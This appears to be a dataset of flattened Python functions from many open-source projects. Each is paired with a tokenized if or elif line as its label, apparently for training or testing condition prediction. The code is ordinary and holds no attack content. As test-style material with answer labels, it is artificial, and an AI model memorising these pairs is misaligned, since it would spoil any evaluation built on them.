{"input": "def get_first_file_by_stem(dir_path, stem, exts=None): dir_path = Path(dir_path) stem = stem.lower() if dir_path.exists(): for x in sorted(list(scandir(str(dir_path))), key=lambda x: x.name): if not x.is_file(): continue xp = Path(x.path) if xp.stem.lower() == stem and (exts is None or xp.suffix.lower() in exts): return xp return None", "label": "if not x . is_file ( ) :"}
{"input": "def testShortCircuit(self): \"\"\"Test that creation short-circuits to reuse existing references\"\"\" sd = {} for s in self.ss: sd[s] = 1 for t in self.ts: if hasattr(t, \"x\"): self.assert_(sd.has_key(safeRef(t.x))) self.assert_(safeRef(t.x) in sd) else: self.assert_(sd.has_key(safeRef(t))) self.assert_(safeRef(t) in sd)", "label": "if hasattr ( t , \"x\" ) :"}
{"input": "def _gen_Less(self, args, ret_type): result = [] for lhs, rhs in pairwise(args): if ret_type == real_type: result.append(self.builder.fcmp_ordered(\"<\", lhs, rhs)) elif ret_type == int_type: result.append(self.builder.icmp_signed(\"<\", lhs, rhs)) else: raise CompileError() return reduce(self.builder.and_, result)", "label": "elif ret_type == int_type :"}
{"input": "def _resolve_aliases(tasks_or_files): for task_or_file in tasks_or_files: if isinstance(task_or_file, Alias): for t_or_f in _resolve_aliases(task_or_file.deps): yield t_or_f else: yield task_or_file", "label": "if isinstance ( task_or_file , Alias ) :"}
{"input": "def report(properties): for name, value in properties: if name.startswith(\"hypothesis-statistics-\"): if hasattr(value, \"uniobj\"): # Under old versions of pytest, `value` was a `py.xml.raw` # rather than a string, so we get the (unicode) string off it. value = value.uniobj line = base64.b64decode(value.encode()).decode() + \"\\n\\n\" terminalreporter.write_line(line)", "label": "if name . startswith ( \"hypothesis-statistics-\" ) :"}
{"input": "def throw_404(self, n): # bl_label of some nodes is edited by us, but those nodes do have docs .. _dirname = os.path.dirname(sverchok.__file__) path1 = os.path.join(_dirname, \"docs\", \"404.html\") path2 = os.path.join(_dirname, \"docs\", \"404_custom.html\") with open(path1) as origin: with open(path2, \"w\") as destination: for line in origin: if \"{{variable}}\" in line: destination.write(line.replace(\"{{variable}}\", n.bl_label)) else: destination.write(line) webbrowser.open(path2)", "label": "if \"{{variable}}\" in line :"}
{"input": "def rm_empty_dirs(dirpath, interactive=False, dry_run=False): for name in os.listdir(dirpath): path = join(dirpath, name) if isdir(path): rm_empty_dirs(path, interactive, dry_run) if not os.listdir(dirpath): if interactive: raise NotImplementedError(\"'-i' not implemented\") if dry_run: log.info(\"rmdir `%s' (dry-run)\", dirpath) else: log.info(\"rmdir `%s'\", dirpath) os.rmdir(dirpath)", "label": "if isdir ( path ) :"}
{"input": "def get_run_cmd(submission_dir): \"\"\"Get the language of a submission\"\"\" with CD(submission_dir): if os.path.exists(\"run.sh\"): with open(\"run.sh\") as f: for line in f: if line[0] != \"#\": return line.rstrip(\"\\r\\n\")", "label": "if os . path . exists ( \"run.sh\" ) :"}
{"input": "def _do_test_fetch_result(self, results, remote): # self._print_fetchhead(remote.repo) self.assertGreater(len(results), 0) self.assertIsInstance(results[0], FetchInfo) for info in results: self.assertIsInstance(info.note, string_types) if isinstance(info.ref, Reference): self.assertTrue(info.flags) # END reference type flags handling self.assertIsInstance(info.ref, (SymbolicReference, Reference)) if info.flags & (info.FORCED_UPDATE | info.FAST_FORWARD): self.assertIsInstance(info.old_commit, Commit) else: self.assertIsNone(info.old_commit)", "label": "if info . flags & ( info . FORCED_UPDATE | info . FAST_FORWARD ) :"}
{"input": "def __set__(self, instance, value): super().__set__(instance, value) value = instance._data[self.name] if value is not None: if isinstance(value, datetime.datetime): instance._data[self.name] = self._convert_from_datetime(value) else: instance._data[self.name] = value", "label": "if isinstance ( value , datetime . datetime ) :"}
{"input": "def put(self, can_split=False): if isinstance(self.expr, NodeConst): if self.expr.is_str(): # 2007 May 01 self.expr.put() else: self.line_more(\"(\") self.expr.put(can_split=True) self.line_more(\")\") else: self.put_expr(self.expr, can_split=can_split) self.line_more(\".\") self.line_more(NAME_SPACE.make_attr_name(self.expr, self.attrname)) return self", "label": "if self . expr . is_str ( ) :"}
{"input": "def get_location(self, dist, dependency_links): for url in dependency_links: egg_fragment = Link(url).egg_fragment if not egg_fragment: continue if \"-\" in egg_fragment: ## FIXME: will this work when a package has - in the name? key = \"-\".join(egg_fragment.split(\"-\")[:-1]).lower() else: key = egg_fragment if key == dist.key: return url.split(\"#\", 1)[0] return None", "label": "if not egg_fragment :"}
{"input": "def _parse_lines(self, lines): for line in lines: self.size += len(line) words = line.strip().split(\"\\t\") if len(words) > 1: wset = set(words[1:]) if words[0] in self.WORDS: self.WORDS[words[0]] |= wset else: self.WORDS[words[0]] = wset", "label": "if words [ 0 ] in self . WORDS :"}
{"input": "def __call__(self, target): # normal running mode if not self.check_run_always: for algo in self.algos: if not algo(target): return False return True # run mode when at least one algo has a run_always attribute else: # store result in res # allows continuation to check for and run # algos that have run_always set to True res = True for algo in self.algos: if res: res = algo(target) elif hasattr(algo, \"run_always\"): if algo.run_always: algo(target) return res", "label": "if res :"}
{"input": "def _cmd_flags_as_data(cmd_flags): data = {} for flag_name, cmd_flag in cmd_flags.items(): cmd_flag_data = _cmd_flag_as_data(cmd_flag) if cmd_flag_data: data[flag_name] = cmd_flag_data return data", "label": "if cmd_flag_data :"}
{"input": "def _csv_iterator(data_path, ngrams, yield_cls=False): tokenizer = get_tokenizer(\"basic_english\") with io.open(data_path, encoding=\"utf8\") as f: reader = unicode_csv_reader(f) for row in reader: tokens = \" \".join(row[1:]) tokens = tokenizer(tokens) if yield_cls: yield int(row[0]) - 1, ngrams_iterator(tokens, ngrams) else: yield ngrams_iterator(tokens, ngrams)", "label": "if yield_cls :"}
{"input": "def FindEnclosingBracketGroup(input_str): stack = [] start = -1 for index, char in enumerate(input_str): if char in LBRACKETS: stack.append(char) if start == -1: start = index elif char in BRACKETS: if not stack: return (-1, -1) if stack.pop() != BRACKETS[char]: return (-1, -1) if not stack: return (start, index + 1) return (-1, -1)", "label": "if stack . pop ( ) != BRACKETS [ char ] :"}
{"input": "def get_and_set_be_comp(self): all_be_comp = [] for page in self.pages: if page.relations.be_comp_norm is not None: all_be_comp.extend(page.relations.be_comp_norm) if page.relations.be_comp is not None: all_be_comp.extend(page.relations.be_comp) return set(all_be_comp)", "label": "if page . relations . be_comp is not None :"}
{"input": "def iterload(self): delim = self.options.delimiter rowdelim = self.options.row_delimiter with self.source.open_text() as fp: with Progress(total=filesize(self.source)) as prog: for line in splitter(fp, rowdelim): if not line: continue prog.addProgress(len(line)) row = list(line.split(delim)) if len(row) < self.nVisibleCols: # extend rows that are missing entries row.extend([None] * (self.nVisibleCols - len(row))) yield row", "label": "if not line :"}
{"input": "def process_module(name, module, parent): if parent: modules[parent][\"items\"].append(name) mg = module_groups.setdefault(name, []) mg.append(parent) if get_module_type(name) == \"py3status\": module[\".group\"] = parent # check module content for k, v in list(module.items()): if k.startswith(\"on_click\"): # on_click event process_onclick(k, v, name) # on_click should not be passed to the module via the config. del module[k] if isinstance(v, ModuleDefinition): # we are a container module[\"items\"] = [] return module", "label": "if isinstance ( v , ModuleDefinition ) :"}
{"input": "def test_identify_accepts_space_separated_hosts(self): ru, iu = self.mock_all_identify() file_ip = open(tests.VALID_FILE_IP) for i, line in enumerate(file_ip): if i < 2: expected_url, expected_host = (\"http://192.168.1.1/\", \"example.com\") elif i == 2: expected_url, expected_host = (\"http://192.168.1.2/drupal/\", \"example.com\") identify_line(line) args, kwargs = ru.call_args_list[-1] self.assertEquals(args[0], expected_url) self.assertEquals(args[1], expected_host)", "label": "if i < 2 :"}
{"input": "def get_version(module): for key in version_keys: if hasattr(module, key): version = getattr(module, key) if isinstance(version, types.ModuleType): version = get_version(version) return version return \"Unknown\"", "label": "if hasattr ( module , key ) :"}
{"input": "def whoami(self): \"\"\"Return user relevant login information.\"\"\" account_data = {} for k in (\"email\", \"account_id\"): value = self.conf.get(k) if not value: account_info = self.get_account_information() value = account_info.get(k, \"unknown\") self.conf.set(k, value) self.conf.save() account_data[k] = value return account_data", "label": "if not value :"}
{"input": "def do(self): if self.in_class_scope(): selected_str = self.view.substr(self.selected_region) for symbol in self.view.symbols(): if symbol[1] == selected_str: self.view.sel().clear() self.view.sel().add(symbol[0]) self.view.show(symbol[0]) return # falls back to the original functionality self.window.run_command(\"goto_definition\")", "label": "if symbol [ 1 ] == selected_str :"}
{"input": "def __iter__(self): i = 0 for category, filename in list(self.input_files.items()): for line in open(filename): line = self._clean_line(line) if self.accept_criteria(i): yield Opinion(line, category) i += 1 if i % 1000 == 0: print(\"\\tReaded {} examples\".format(i))", "label": "if self . accept_criteria ( i ) :"}
{"input": "def recvmsg(self, *args): while True: try: return self._sock.recvmsg(*args) except error as ex: if ex.args[0] != EWOULDBLOCK or self.timeout == 0.0: raise self._wait(self._read_event)", "label": "if ex . args [ 0 ] != EWOULDBLOCK or self . timeout == 0.0 :"}
{"input": "def _get_editable_fields(cls): fds = set([]) for field in cls._meta.concrete_fields: if hasattr(field, \"attname\"): if field.attname == \"id\": continue elif field.attname.endswith(\"ptr_id\"): # polymorphic fields should always be non-editable, see: # https://github.com/django-polymorphic/django-polymorphic/issues/349 continue if getattr(field, \"editable\", True): fds.add(field.attname) return fds", "label": "if hasattr ( field , \"attname\" ) :"}
{"input": "def prepare_fields(all_fields, submit_fields, submit): if len(list(submit_fields.items(multi=True))) > 1: if not submit: raise exceptions.InvalidSubmitError() if submit not in submit_fields.getlist(submit.name): raise exceptions.InvalidSubmitError() return _filter_fields( all_fields, lambda f: not isinstance(f, fields.Submit) or f == submit ) return all_fields", "label": "if submit not in submit_fields . getlist ( submit . name ) :"}
{"input": "def tag_configure(self, *args, **keys): if len(args) == 1: key = args[0] self.tags[key] = keys val = keys.get(\"foreground\") underline = keys.get(\"underline\") if val: self.configDict[key] = val if underline: self.configUnderlineDict[key] = True else: g.trace(\"oops\", args, keys)", "label": "if val :"}
{"input": "def detect(get_page): retval = False for vector in WAF_ATTACK_VECTORS: page, headers, code = get_page(get=vector) retval = ( code == 501 and re.search(r\"Reference #[0-9A-Fa-f.]+\", page, re.I) is not None ) if retval: break return retval", "label": "if retval :"}
{"input": "def refine_pointer_names_input(lines): \"\"\"Return a list of width_info_t. Skip comments and blank lines\"\"\" global comment_pattern widths_list = [] for line in lines: pline = comment_pattern.sub(\"\", line).strip() if pline == \"\": continue wrds = pline.split() ntokens = len(wrds) if ntokens == 3: (bbytes, name, suffix) = wrds else: die(\"Bad number of tokens on line: \" + line) widths_list.append((bbytes, name, suffix)) return widths_list", "label": "if ntokens == 3 :"}
{"input": "def notify(title, message, retcode=None): \"\"\"Sends message over Telegram using telegram-send, title is ignored.\"\"\" if not path.exists(config_file): if not path.exists(config_dir): makedirs(config_dir) print(\"Follow the instructions to configure the Telegram backend.\\n\") configure(config_file) send(messages=[message], conf=config_file)", "label": "if not path . exists ( config_dir ) :"}
{"input": "def find_on_path(targets): \"\"\"Search the PATH for a program and return full path\"\"\" if sabnzbd.WIN32: paths = os.getenv(\"PATH\").split(\";\") else: paths = os.getenv(\"PATH\").split(\":\") if isinstance(targets, str): targets = (targets,) for path in paths: for target in targets: target_path = os.path.abspath(os.path.join(path, target)) if os.path.isfile(target_path) and os.access(target_path, os.X_OK): return target_path return None", "label": "if os . path . isfile ( target_path ) and os . access ( target_path , os . X_OK ) :"}
{"input": "def test_name_attribute(self): for cons in self.hash_constructors: h = cons() self.assertIsInstance(h.name, str) if h.name in self.supported_hash_names: self.assertIn(h.name, self.supported_hash_names) else: self.assertNotIn(h.name, self.supported_hash_names) self.assertEqual(h.name, hashlib.new(h.name).name)", "label": "if h . name in self . supported_hash_names :"}
{"input": "def find_marriage(database, family): \"\"\"find the marriage of a family\"\"\" for event_ref in family.get_event_ref_list(): event = database.get_event_from_handle(event_ref.ref) if event and event.type.is_marriage() and event_ref.role.is_family(): return event return None", "label": "if event and event . type . is_marriage ( ) and event_ref . role . is_family ( ) :"}
{"input": "def test_find_ancestors(self): vhsblocks = self.config.parser_root.find_blocks(\"VirtualHost\") macro_test = False nonmacro_test = False for vh in vhsblocks: if \"/macro/\" in vh.metadata[\"augeaspath\"].lower(): ancs = vh.find_ancestors(\"Macro\") self.assertEqual(len(ancs), 1) macro_test = True else: ancs = vh.find_ancestors(\"Macro\") self.assertEqual(len(ancs), 0) nonmacro_test = True self.assertTrue(macro_test) self.assertTrue(nonmacro_test)", "label": "if \"/macro/\" in vh . metadata [ \"augeaspath\" ] . lower ( ) :"}
{"input": "def readline(self): while 1: line = self._readline() if line: self._filelineno += 1 return line if not self._file: return line self.nextfile()", "label": "if line :"}
{"input": "def read_oclc(fields): if \"035\" not in fields: return {} found = [] for line in fields[\"035\"]: for v in get_subfield_values(line, [\"a\"]): m = re_oclc.match(v) if not m: continue oclc = m.group(1) if oclc not in found: found.append(oclc) return {\"oclc_number\": found} if found else {}", "label": "if oclc not in found :"}
{"input": "def get_new_unlinked_nodes( before_inputted_nodes, before_input_sockets, input_sockets, nodes_dict ): affected_nodes = [] for node_id, socket in zip(before_inputted_nodes, before_input_sockets): if not socket in input_sockets: # if the node has been deleted it is not affected if node_id in nodes_dict: if not node_id in affected_nodes: affected_nodes.append(node_id) return affected_nodes", "label": "if node_id in nodes_dict :"}
{"input": "def set_available_qty(self): for d in self.get(\"required_items\"): if d.source_warehouse: d.available_qty_at_source_warehouse = get_latest_stock_qty( d.item_code, d.source_warehouse ) if self.wip_warehouse: d.available_qty_at_wip_warehouse = get_latest_stock_qty( d.item_code, self.wip_warehouse )", "label": "if d . source_warehouse :"}
{"input": "def _unique_product_recursive(pools, result, i): if i >= len(pools): yield tuple(result) return for e in pools[i]: if e not in result: result[i] = e yield from _unique_product_recursive(pools, result, i + 1) result[i] = _SENTINEL", "label": "if e not in result :"}
{"input": "def fileno(self): try: return self.sock.fileno() except socket.error: self.close() ex = sys.exc_info()[1] if get_exc_errno(ex) == errno.EBADF: raise EOFError() else: raise", "label": "if get_exc_errno ( ex ) == errno . EBADF :"}
{"input": "def expand_block(self, feat): \"\"\"Expand any blocks which are near the start or end of a contig.\"\"\" chrom_end = self._ref_sizes.get(feat.chrom) if chrom_end: if feat.start < self._end_buffer: feat.start = 0 if feat.stop >= chrom_end - self._end_buffer: feat.stop = chrom_end return feat", "label": "if feat . stop >= chrom_end - self . _end_buffer :"}
{"input": "def prepare_parser(self, parser): docs = [self.parse_doc(doc) for doc in (self.doc, __doc__) if doc] for doc in docs: for long_opt, help in items(doc): option = parser._option_string_actions[long_opt] if option is not None: option.help = \" \".join(help).format(default=option.default) return parser", "label": "if option is not None :"}
{"input": "def negate(monad): sql = monad.getsql()[0] translator = monad.translator if translator.dialect == \"Oracle\": result_sql = [\"IS_NULL\", sql] else: result_sql = [\"EQ\", sql, [\"VALUE\", \"\"]] if monad.nullable: if isinstance(monad, AttrMonad): result_sql = [\"OR\", result_sql, [\"IS_NULL\", sql]] else: result_sql = [\"EQ\", [\"COALESCE\", sql, [\"VALUE\", \"\"]], [\"VALUE\", \"\"]] result = BoolExprMonad(result_sql, nullable=False) result.aggregated = monad.aggregated return result", "label": "if isinstance ( monad , AttrMonad ) :"}
{"input": "def _ReadN(self, stdin_fd, n): # type: (int, int) -> str chunks = [] # type: List[str] bytes_left = n while bytes_left > 0: chunk = posix.read(stdin_fd, n) # read at up to N chars if len(chunk) == 0: break chunks.append(chunk) bytes_left -= len(chunk) s = \"\".join(chunks) return s", "label": "if len ( chunk ) == 0 :"}
{"input": "def instance_reader(): for epoch_index in range(epoch): if shuffle: if shuffle_seed is not None: np.random.seed(shuffle_seed) np.random.shuffle(examples) if phase == \"train\": self.current_train_epoch = epoch_index for (index, example) in enumerate(examples): if phase == \"train\": self.current_train_example = index + 1 feature = self.convert_example( index, example, self.get_labels(), self.max_seq_len, self.tokenizer ) instance = self.generate_instance(feature) yield instance", "label": "if shuffle_seed is not None :"}
{"input": "def close(self): fileobj = self.fileobj if fileobj is None: return self.fileobj = None try: if self.mode == WRITE: fileobj.write(self.compress.flush()) write32u(fileobj, self.crc) # self.size may exceed 2GB, or even 4GB write32u(fileobj, self.size & 0xFFFFFFFF) finally: myfileobj = self.myfileobj if myfileobj: self.myfileobj = None myfileobj.close()", "label": "if myfileobj :"}
{"input": "def rsa_public_key_parse(key_material): # These imports take ~.5s; let's keep them local import sshpubkeys.exceptions from sshpubkeys.keys import SSHKey try: if not isinstance(key_material, six.binary_type): key_material = key_material.encode(\"ascii\") decoded_key = base64.b64decode(key_material).decode(\"ascii\") public_key = SSHKey(decoded_key) except (sshpubkeys.exceptions.InvalidKeyException, UnicodeDecodeError): raise ValueError(\"bad key\") if not public_key.rsa: raise ValueError(\"bad key\") return public_key.rsa", "label": "if not isinstance ( key_material , six . binary_type ) :"}
{"input": "def import_type(library, name): if library.name != idaapi.cvar.idati.name: last_ordinal = idaapi.get_ordinal_qty(idaapi.cvar.idati) type_id = idaapi.import_type(library, -1, name) # tid_t if type_id != idaapi.BADORD: return last_ordinal", "label": "if type_id != idaapi . BADORD :"}
{"input": "def OnDropFiles(self, x, y, files): filteredList = [] if self.filenameFilter is not None: for f in files: for ext in self.filenameFilter: if f.endswith(ext) or f.endswith(ext.upper()): filteredList.append(f) else: filteredList = files if len(filteredList) > 0: self.callback(filteredList)", "label": "if f . endswith ( ext ) or f . endswith ( ext . upper ( ) ) :"}
{"input": "def _get_most_recent_update(self, versions): recent = None for version in versions: updated = datetime.datetime.strptime(version[\"updated\"], \"%Y-%m-%dT%H:%M:%SZ\") if not recent: recent = updated elif updated > recent: recent = updated return recent.strftime(\"%Y-%m-%dT%H:%M:%SZ\")", "label": "elif updated > recent :"}
{"input": "def __setstate__(self, servers_ids: List[str]): self.try_list = [] for server_id in servers_ids: if server_id in sabnzbd.Downloader.server_dict: self.add_to_try_list(sabnzbd.Downloader.server_dict[server_id])", "label": "if server_id in sabnzbd . Downloader . server_dict :"}
{"input": "def remove_command(self, command_id): for command in self.config[\"commands\"]: if command[EXECUTE_ID] == command_id: self.config[\"commands\"].remove(command) component.get(\"EventManager\").emit(ExecuteCommandRemovedEvent(command_id)) break self.config.save()", "label": "if command [ EXECUTE_ID ] == command_id :"}
{"input": "def wrapper(*args, **kargs): offspring = func(*args, **kargs) for child in offspring: for i in xrange(len(child)): if child[i] > max: child[i] = max elif child[i] < min: child[i] = min return offspring", "label": "if child [ i ] > max :"}
{"input": "def dispatch(self, request, *args, **kwargs): self.product = get_object_or_404(self.product_model, pk=kwargs[\"product_pk\"]) # check permission to leave review if not self.product.is_review_permitted(request.user): if self.product.has_review_by(request.user): message = _(\"You have already reviewed this product!\") else: message = _(\"You can't leave a review for this product.\") messages.warning(self.request, message) return redirect(self.product.get_absolute_url()) return super().dispatch(request, *args, **kwargs)", "label": "if self . product . has_review_by ( request . user ) :"}
{"input": "def PlayPause(self): state = self.graphManager.GetState(10) if state == 2: # playing self.Pause() elif state == 1: # paused self.Play() elif state == 0: # stopped if (self.SelectedItem != None) and (self.filename != self.SelectedItem.Path): self.Stop() self.PlayingItem = self.SelectedItem self.LoadFile(self.SelectedItem.Path) self.Play() else: self.Play() else: pass # for now just do nothing self.NotifyPropertyChanged(\"IsPlaying\") self.NotifyPropertyChanged(\"Duration\")", "label": "if ( self . SelectedItem != None ) and ( self . filename != self . SelectedItem . Path ) :"}
{"input": "def decref(self, *keys): for tileable_key, tileable_id in keys: if tileable_key not in self._executed_tileables: continue _graph_key, ids = self._executed_tileables[tileable_key] if tileable_id in ids: ids.remove(tileable_id) # for those same key tileables, do decref only when all those tileables are garbage collected if len(ids) != 0: continue self.delete_data(tileable_key)", "label": "if tileable_id in ids :"}
{"input": "def get_git_description(self): if self.is_a_git_repo(): exit_code, stdout, stderr = execute_command_and_capture_output( \"git\", \"describe\", \"--always\", \"--tags\", \"--dirty\" ) if exit_code != 0: raise PyBuilderException( \"Cannot determine git description: git describe failed:\\n{0}\".format( stderr ) ) else: return stdout.strip() else: raise PyBuilderException( \"Cannot determine git description: project is not a git repo.\" )", "label": "if exit_code != 0 :"}
{"input": "def _code_for_module(self, module): text = '\"%s\" [shape=ellips]' % module.name for item in list(module.items()): if isinstance(item, str): text += '\\n\"%s\"' % item text += '\\n\"%s\" -> \"%s\"' % (module.name, item) else: text += self._code_for_module(item) # recurs text += '\\n\"%s\" -> \"%s\"' % (module.name, item.name) return text", "label": "if isinstance ( item , str ) :"}
{"input": "def test_images_p_is_stochastic_parameter(self): aug = self.create_aug(p=iap.Choice([0, 1], p=[0.7, 0.3])) seen = [0, 0] for _ in sm.xrange(1000): observed = aug.augment_image(self.image) if np.array_equal(observed, self.image): seen[0] += 1 elif np.array_equal(observed, self.image_flipped): seen[1] += 1 else: assert False assert np.allclose(seen, [700, 300], rtol=0, atol=75)", "label": "if np . array_equal ( observed , self . image ) :"}
{"input": "def get_index_text(self, modname: str, name_cls: Tuple[str, str]) -> str: if self.objtype == \"function\": if not modname: return _(\"%s() (built-in function)\") % name_cls[0] return _(\"%s() (in module %s)\") % (name_cls[0], modname) elif self.objtype == \"data\": if not modname: return _(\"%s (built-in variable)\") % name_cls[0] return _(\"%s (in module %s)\") % (name_cls[0], modname) else: return \"\"", "label": "if not modname :"}
{"input": "def _attributes_to_xml(self, xml_element, prefix_root, debug_context=None): del debug_context # Unused. for attribute_name, attribute in six.iteritems(self._attributes): attribute_value = attribute.to_xml_string(prefix_root) if attribute_name == self._spec.identifier and attribute_value is None: xml_element.set(attribute_name, self.full_identifier) elif attribute_value is None: continue else: xml_element.set(attribute_name, attribute_value)", "label": "elif attribute_value is None :"}
{"input": "def index_def(self): if self.index_def_ is None: self.lazy_init_lock_.acquire() try: if self.index_def_ is None: self.index_def_ = Index() finally: self.lazy_init_lock_.release() return self.index_def_", "label": "if self . index_def_ is None :"}
{"input": "def _ord_to_str(ordinal, weights): \"\"\"Reverse function of _str_to_ord.\"\"\" chars = [] for weight in weights: if ordinal == 0: return \"\".join(chars) ordinal -= 1 index, ordinal = divmod(ordinal, weight) chars.append(_ALPHABET[index]) return \"\".join(chars)", "label": "if ordinal == 0 :"}
{"input": "def tip_texts(self): \"\"\"Return the tip texts of the Toolbar (without window text)\"\"\" texts = [] for i in range(0, self.button_count()): # it works for MFC btn_tooltip_index = self.get_button_struct(i).iString # usually iString == -1 for separator # other cases if any if not (-1 <= btn_tooltip_index < self.get_tool_tips_control().tool_count()): btn_tooltip_index = i btn_text = self.get_tool_tips_control().get_tip_text(btn_tooltip_index + 1) texts.append(btn_text) return texts", "label": "if not ( - 1 <= btn_tooltip_index < self . get_tool_tips_control ( ) . tool_count ( ) ) :"}
{"input": "def _initCaseSets(self): self._cs = {} self._css = {} for cs in self._caseSets: if not self._cs.has_key(cs.CaseSetName): self._cs[cs.CaseSetName] = {} self._css[cs.CaseSetName] = cs else: raise Exception(\"duplicate case set name\") for c in cs.Cases: idx = tuple(c.index) if not self._cs[cs.CaseSetName].has_key(idx): self._cs[cs.CaseSetName][idx] = c else: raise Exception(\"duplicate case index\")", "label": "if not self . _cs [ cs . CaseSetName ] . has_key ( idx ) :"}
{"input": "def is_image(self, input): try: if isinstance(input, (np.ndarray, Image.Image)): return True elif isinstance(input, str): if not os.path.isfile(input): raise ValueError(\"input must be a file\") img = Image.open(input) _ = img.size return True else: return False except: return False", "label": "elif isinstance ( input , str ) :"}
{"input": "def __init__(self, opt, shared=None): super().__init__(opt, shared) if not shared: self.episodes = [] self.num_exs = 0 if opt.get(\"parlaidialogteacher_datafile\") is not None: self._setup_data(opt.get(\"parlaidialogteacher_datafile\")) else: self.episodes = shared[\"episodes\"] self.num_exs = sum(len(e) for e in self.episodes) self.id = opt[\"task\"] self.reset()", "label": "if opt . get ( \"parlaidialogteacher_datafile\" ) is not None :"}
{"input": "def draw(l, n, th=2): clear() l = l * f ** n shapesize(l / 100.0, l / 100.0, th) for k in tiledict: h, x, y = k setpos(x, y) setheading(h) if tiledict[k]: shape(\"kite\") color(\"black\", (0, 0.75, 0)) else: shape(\"dart\") color(\"black\", (0.75, 0, 0)) stamp()", "label": "if tiledict [ k ] :"}
{"input": "def visit_Assign(self, node): if len(node.targets) == 1: if isinstance(node.targets[0], ast.Subscript): plugPath = self.__plugPath(self.__path(node.targets[0])) if plugPath: self.plugWrites.add(plugPath) self.visit(node.value)", "label": "if plugPath :"}
{"input": "def StripTypeInfo(rendered_data): \"\"\"Strips type information from rendered data. Useful for debugging.\"\"\" if isinstance(rendered_data, (list, tuple)): return [StripTypeInfo(d) for d in rendered_data] elif isinstance(rendered_data, dict): if \"value\" in rendered_data and \"type\" in rendered_data: return StripTypeInfo(rendered_data[\"value\"]) else: result = {} for k, v in rendered_data.items(): result[k] = StripTypeInfo(v) return result else: return rendered_data", "label": "if \"value\" in rendered_data and \"type\" in rendered_data :"}
{"input": "def _match_greater_than_or_equal(search_base, attribute, value, candidates): matches = list() for entry in candidates: dn = entry.get(\"dn\") if not dn.endswith(search_base): continue value_from_directory = entry.get(\"attributes\").get(attribute) if str(value_from_directory) >= str(value): entry[\"type\"] = \"searchResEntry\" matches.append(entry) return matches", "label": "if not dn . endswith ( search_base ) :"}
{"input": "def _get_changes(diff): \"\"\"Get a list of changed versions from git.\"\"\" changes_dict = {} for line in diff: if not line.startswith(\"-\") and not line.startswith(\"+\"): continue if line.startswith(\"+++ \") or line.startswith(\"--- \"): continue name, version = parse_versioned_line(line[1:]) if name not in changes_dict: changes_dict[name] = Change(name) if line.startswith(\"-\"): changes_dict[name].old = version elif line.startswith(\"+\"): changes_dict[name].new = version return [change for _name, change in sorted(changes_dict.items())]", "label": "if name not in changes_dict :"}
{"input": "def append_row(tbody, cells): row = nodes.row() tbody += row for cell in cells: entry = nodes.entry() row += entry if isinstance(cell, six.text_type): node = nodes.paragraph(text=cell) else: node = cell entry += node", "label": "if isinstance ( cell , six . text_type ) :"}
{"input": "def _testdata_to_is_unauthed_access_permitted(tests_config, node_type): res = [] for x in tests_config[\"endpoint_tests\"]: if node_type not in x[\"type\"]: continue if \"is_unauthed_access_permitted\" not in x[\"tests\"]: continue h = x[\"tests\"][\"is_unauthed_access_permitted\"] for p in h[\"locations\"]: res.append((p, h.get(\"vhost\", None))) return res", "label": "if \"is_unauthed_access_permitted\" not in x [ \"tests\" ] :"}
{"input": "def process_ceph_status(output): res = patternchk.search(output) if not res: return {} ceph_stats = res.group() if not ceph_stats: return {} ret = {} rd = wr = iops = None rd = numberchk.search(ceph_stats) if rd is not None: ret[\"rd\"] = rd.group() wr = numberchk.search(ceph_stats, rd.end()) if wr is not None: ret[\"wr\"] = wr.group() iops = numberchk.search(ceph_stats, wr.end()) if iops is not None: ret[\"iops\"] = iops.group() return ret", "label": "if iops is not None :"}
{"input": "def construct_type_storage_plugin_registry(pipeline_def, system_storage_def): # Needed to avoid circular dep from dagster.core.definitions import PipelineDefinition, SystemStorageDefinition check.inst_param(pipeline_def, \"pipeline_def\", PipelineDefinition) check.inst_param(system_storage_def, \"system_storage_def\", SystemStorageDefinition) type_plugins = [] for type_obj in pipeline_def.all_runtime_types(): for auto_plugin in type_obj.auto_plugins: if auto_plugin.compatible_with_storage_def(system_storage_def): type_plugins.append((type_obj, auto_plugin)) return TypeStoragePluginRegistry(type_plugins)", "label": "if auto_plugin . compatible_with_storage_def ( system_storage_def ) :"}
{"input": "def attr(**kw): kw = kw.items() kw.sort() parts = [] for name, value in kw: if value is None: continue if name.endswith(\"_\"): name = name[:-1] parts.append('%s=\"%s\"' % (html_quote(name), html_quote(value))) return html(\" \".join(parts))", "label": "if value is None :"}
{"input": "def test_shape(): from lasagne.init import Initializer # Assert that all `Initializer` sublasses return the shape that # we've asked for in `sample`: for klass in Initializer.__subclasses__(): if len(klass.__subclasses__()): # check HeNormal, HeUniform, GlorotNormal, GlorotUniform for sub_klass in klass.__subclasses__(): assert sub_klass().sample((12, 23)).shape == (12, 23) else: assert klass().sample((12, 23)).shape == (12, 23)", "label": "if len ( klass . __subclasses__ ( ) ) :"}
{"input": "def __call__(self, data): num_points = data.pos.shape[0] new_data = Data() for key in data.keys: if key == KDTREE_KEY: continue item = data[key] if torch.is_tensor(item) and num_points == item.shape[0]: item = item[self._indices].clone() elif torch.is_tensor(item): item = item.clone() setattr(new_data, key, item) return new_data", "label": "elif torch . is_tensor ( item ) :"}
{"input": "def vars(self): ret = [] if op.disklist: varlist = op.disklist elif not op.full: varlist = (\"total\",) else: varlist = [] for name in self.discover: if self.diskfilter.match(name): continue varlist.append(name) # if len(varlist) > 2: varlist = varlist[0:2] varlist.sort() for name in varlist: if name in self.discover + [\"total\"] or name in op.diskset: ret.append(name) return ret", "label": "if self . diskfilter . match ( name ) :"}
{"input": "def _convertNbBytesinNbBits(self, nbBytes): nbMinBit = None nbMaxBit = None if nbBytes is not None: if isinstance(nbBytes, int): nbMinBit = nbBytes * 8 nbMaxBit = nbMinBit else: if nbBytes[0] is not None: nbMinBit = nbBytes[0] * 8 if nbBytes[1] is not None: nbMaxBit = nbBytes[1] * 8 return (nbMinBit, nbMaxBit)", "label": "if isinstance ( nbBytes , int ) :"}
{"input": "def after_test(self, results, tmp_dir): return_data = dict() if not results or not results.get(\"data\"): return return_data for filename in results[\"data\"]: if not has_ext(filename, \".log\"): continue with open(filename, \"r\") as f: log_content = f.read() log_analyser.make_log_analyses(log_content, return_data) return return_data", "label": "if not has_ext ( filename , \".log\" ) :"}
{"input": "def ensure_vm_was_torn_down(): vm_labels = [] for vm_ref in xenapi_fake.get_all(\"VM\"): vm_rec = xenapi_fake.get_record(\"VM\", vm_ref) if not vm_rec[\"is_control_domain\"]: vm_labels.append(vm_rec[\"name_label\"]) self.assertEquals(vm_labels, [\"1\"])", "label": "if not vm_rec [ \"is_control_domain\" ] :"}
